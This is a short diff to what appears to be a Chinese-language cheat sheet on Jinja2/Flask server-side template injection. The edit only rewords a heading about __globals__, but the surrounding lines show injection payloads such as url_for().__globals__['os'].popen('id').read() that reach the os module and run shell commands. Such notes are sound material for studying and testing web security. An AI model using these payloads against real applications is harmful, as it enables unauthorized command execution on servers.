@@ -48,7 +48,7 @@ cat().__class__.__init__
 url_for().__globals__['os'].popen('id').read()
 ```
 
-#### `__globals__`:对象方法模块的全局字典,包含os等主要模块
+#### `__globals__`:对象方法模块出生的全局字典,包含os等主要模块
 
 ```
 url_for().__class__.__init__.__globals__
